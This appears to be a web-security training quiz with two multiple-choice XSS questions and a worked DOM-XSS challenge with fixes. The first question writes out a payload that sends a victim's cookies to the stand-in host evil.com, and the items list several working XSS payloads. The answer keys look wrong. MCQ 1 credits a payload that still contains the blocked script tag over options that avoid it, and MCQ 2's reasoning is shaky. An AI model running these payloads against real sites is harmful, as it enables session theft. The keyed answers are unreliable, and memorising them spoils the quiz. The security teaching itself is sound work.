


---

### 🧪 MCQ 1 – XSS Filter Bypass

**Question:**  
You're testing a travel booking web app. The "destination" search field reflects user input directly in the HTML with no escaping.  
Server response:
```html
<p>Searching for flights to: [USER_INPUT]</p>
```
You enter: `"><script>fetch('https://evil.com/'+document.cookie)</script>`  
But it gets blocked by a WAF with the message: "Blocked: script tag detected"

**Which of the following payloads is MOST likely to bypass the filter and still achieve XSS?**

A. `<img src=x onerror=alert(1)>`  
B. `<script type=text/javascript>alert(1)</script>`  
C. `<svg/onload=alert(1)>`  
D. `<scr<script>ipt>alert(1)</script>`

**Answer:** D  
**Explanation:** A polyglot tag bypasses basic string-matching WAFs while remaining functional in the browser. Option D splits the `script` tag in a way that bypasses blacklist filters but executes fully.

---

### 🧪 MCQ 2 – DOM-Based XSS Injection

**Question:**  
A React app has this code:  
```js
const params = new URLSearchParams(window.location.search);  
document.getElementById("welcome").innerHTML = params.get("name");
```

Which payload will most likely execute an alert if there’s no CSP or framework sanitization?

A. `?name=<script>alert('XSS')</script>`  
B. `?name="><img src=x onerror=alert('XSS')>`  
C. `?name=<svg/onload=alert('XSS')>`  
D. `?name="><svg onload=alert('XSS')>`

**Answer:** D  
**Explanation:** Script tags do not execute when inserted via `.innerHTML`, but `svg` tags with event handlers like `onload` do. This makes option D the most reliable payload for this DOM-based context.

---

### 🧨 DOM XSS – Real-World Challenge 1

**Code Snippet:**
```js
const route = new URLSearchParams(location.search).get("view");
document.getElementById("container").innerHTML = `<div>${route}</div>`;
```

**Payload:** `?view="><svg onload=alert('XSS')>`

**Explanation:**  
- User input is reflected via `.innerHTML` without sanitization.  
- Payload breaks out of the `<div>`, injects an `<svg>` tag.  
- `onload` executes, triggering XSS.

**Fixes:**  
1. Replace `.innerHTML` with `.textContent`  
2. Use `DOMPurify.sanitize(route)` before insertion